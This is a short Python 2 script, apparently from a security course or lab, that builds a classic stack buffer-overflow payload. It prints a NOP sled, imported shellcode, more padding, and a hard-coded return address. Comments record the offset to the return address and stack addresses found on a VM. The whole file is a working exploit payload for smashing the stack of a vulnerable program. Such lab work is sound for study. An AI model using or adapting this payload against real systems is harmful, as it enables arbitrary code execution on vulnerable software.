from shellcode import shellcode
print '\x90'*500 + shellcode+ '\x90'*513 + '\x10\xda\xfe\xbf'
#'B'*4

#1036 till ret
#0xbffefb60: should be inside enough starts at 30

#VM
#0xbffeda10: